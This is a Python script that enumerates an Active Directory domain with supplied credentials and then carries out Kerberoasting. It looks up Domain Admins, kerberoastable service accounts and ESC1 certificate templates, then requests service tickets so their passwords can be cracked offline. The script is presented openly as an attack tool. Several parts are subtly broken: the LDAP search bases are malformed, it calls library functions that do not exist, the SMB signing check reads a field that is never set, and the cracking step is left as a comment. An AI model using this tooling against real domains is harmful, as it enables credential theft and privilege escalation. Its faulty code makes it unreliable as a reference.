import dns.resolver
import ldap3
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGS
import requests
import sys

def check_weak_passwords(username, password, domain):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return

        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(&(objectClass=user)(pwdLastSet<=12960000000000000))',  # Password last set more than 150 days ago
                    search_scope=ldap3.SUBTREE,
                    attributes=['sAMAccountName'])

        if conn.entries:
            print("Users with Weak Passwords:")
            for entry in conn.entries:
                print(entry.sAMAccountName.value)
        else:
            print("No users with weak passwords found.")

    except Exception as e:
        print(f"Error while checking weak passwords: {e}")

def check_for_persistence(username, password, domain):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return

        conn.search(search_base='CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(objectClass=serviceConnectionPoint)',
                    search_scope=ldap3.SUBTREE,
                    attributes=['serviceBindingInformation'])

        if conn.entries:
            print("Services with Persistence:")
            for entry in conn.entries:
                print(entry.serviceBindingInformation.value)
        else:
            print("No services with persistence found.")

    except Exception as e:
        print(f"Error while checking for persistence: {e}")

def find_esc1_certificate_templates(username, password, domain):
    try:
        domain_controllers = discover_domain_controllers(domain)

        for dc in domain_controllers:
            server = ldap3.Server(dc['hostname'], port=dc['port'], get_info=ldap3.ALL)
            conn = ldap3.Connection(server, user=username, password=password)
            if not conn.bind():
                print(f"Failed to authenticate with provided credentials to {dc['hostname']}.")
                continue

            search_base = 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.'))
            search_filter = '(&(objectClass=pKICertificateTemplate)(!(name=DomainControllerAuthentication))(msPKI-Certificate-Template-OID=1.3.6.1.4.1.311.21.8.11141852.2904762.4056951.8883555.2409484.547.1.2))'
            attributes = ['displayName']
            
            conn.search(search_base=search_base,
                        search_filter=search_filter,
                        search_scope=ldap3.SUBTREE,
                        attributes=attributes)

            if conn.entries:
                print(f"ESC1 certificate templates found on {dc['hostname']}:")
                for entry in conn.entries:
                    print(entry.displayName.value)
            else:
                print(f"No ESC1 certificate templates found on {dc['hostname']}.")

    except Exception as e:
        print(f"Error while searching for ESC1 certificate templates: {e}")
        
def get_domain_controllers(domain, username, password):
    try:
        # Discover LDAP servers using SRV records
        srv_records = dns.resolver.resolve(f'_ldap._tcp.dc._msdcs.{domain}', 'SRV')
        domain_controllers = []

        # Extract domain controllers' hostnames and ports from SRV records
        for record in srv_records:
            domain_controller = {
                'hostname': str(record.target).rstrip('.'),
                'port': record.port,
                'weight': record.weight,
                'priority': record.priority
            }
            domain_controllers.append(domain_controller)

        return domain_controllers

    except Exception as e:
        print(f"Error while discovering domain controllers: {e}")
        return []
    
def discover_domain_controllers(domain):
    try:
        # Discover LDAP servers using SRV records
        srv_records = ldap3.dns.resolver.query(f'_ldap._tcp.dc._msdcs.{domain}', 'SRV')
        domain_controllers = []

        # Extract domain controllers' hostnames and ports from SRV records
        for record in srv_records:
            domain_controller = {
                'hostname': str(record.target).rstrip('.'),
                'port': record.port,
                'weight': record.weight,
                'priority': record.priority
            }
            domain_controllers.append(domain_controller)

        return domain_controllers

    except Exception as e:
        print(f"Error while discovering domain controllers: {e}")
        return []
    

def check_smb_signing_not_required_ldap(domain, username, password):
    try:
        domain_controllers = get_domain_controllers(domain, username, password)
        if not domain_controllers:
            print("No Domain Controllers found.")
            return

        for dc in domain_controllers:
            if 1 in dc['encryption_types']:
                print(f"Domain Controller {dc['hostname']}: SMB Signing not required.")
            else:
                print(f"Domain Controller {dc['hostname']}: SMB Signing required.")

    except Exception as e:
        print(f"Error while checking SMB Signing: {e}")

def get_user_permissions(username, password, domain):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return []

        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter=f'(&(objectClass=user)(sAMAccountName={username}))',
                    search_scope=ldap3.SUBTREE,
                    attributes=['memberOf'])

        if conn.entries:
            user_groups = [str(group) for group in conn.entries[0]['memberOf'].values]
            print(f"User {username} is a member of the following groups:")
            for group in user_groups:
                print(group)
            return user_groups
        else:
            print(f"User {username} not found.")
            return []

    except Exception as e:
        print(f"Error while getting user permissions: {e}")
        return []

def get_domain_admins(domain, username, password):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return []

        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')) + '))',
                    search_scope=ldap3.SUBTREE,
                    attributes=['sAMAccountName'])

        if conn.entries:
            domain_admins = [entry.sAMAccountName.value for entry in conn.entries]
            print("Domain Admins:")
            for admin in domain_admins:
                print(admin)
            return domain_admins
        else:
            print("No Domain Admins found.")
            return []

    except Exception as e:
        print(f"Error while getting Domain Admins: {e}")
        return []

def get_kerberoastable_accounts(domain, username, password):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return []

        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(&(objectClass=user)(servicePrincipalName=*)(!adminCount=1))',
                    search_scope=ldap3.SUBTREE,
                    attributes=['sAMAccountName'])

        if conn.entries:
            kerberoastable_accounts = [entry.sAMAccountName.value for entry in conn.entries]
            print("Kerberoastable Accounts:")
            for account in kerberoastable_accounts:
                print(account)
            return kerberoastable_accounts
        else:
            print("No kerberoastable accounts found.")

    except Exception as e:
        print(f"Error while getting kerberoastable accounts: {e}")
        return []

def kerberoast(domain, username, password, kerberoastable_accounts):
    try:
        for account in kerberoastable_accounts:
            print(f"Attempting to Kerberoast account: {account}")

            # Request a service ticket (TGS) for the kerberoastable account
            tgs, enc_part = getKerberosTGS(username, password, domain, account)

            # Extract the encrypted ticket from the TGS response
            ccache = CCache()
            ccache.fromTGS(tgs)
            ticket = ccache.credentials[0].ticket

            # Perform offline brute-force attacks to crack the passwords
            # Here you can implement your cracking logic, such as using dictionary attacks or hash cracking tools

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def main():
    if len(sys.argv) != 4:
        print("Usage: python script.py <username> <password> <domain>")
        sys.exit(1)

    username = sys.argv[1]
    password = sys.argv[2]
    domain = sys.argv[3]

    #Check for Domain Controllers
    discover_domain_controllers(domain)

    # Check for weak passwords
    check_weak_passwords(username, password, domain)

    # Check for persistence
    check_for_persistence(username, password, domain)

    #check for esc1
    find_esc1_certificate_templates(username, password, domain)    

    # Check for machines with WebDAV enabled
    # check_webdav_enabled(domain)

    # Check for computers with SMB Signing not required using LDAP
    check_smb_signing_not_required_ldap(domain, username, password)

    # Get current user's permissions
    get_user_permissions(username, password, domain)

    # Get Domain Admins
    get_domain_admins(domain, username, password)

    # Retrieve kerberoastable accounts
    kerberoastable_accounts = get_kerberoastable_accounts(domain, username, password)

    # Execute the Kerberoasting attack
    kerberoast(domain, username, password, kerberoastable_accounts)

if __name__ == "__main__":
    main()

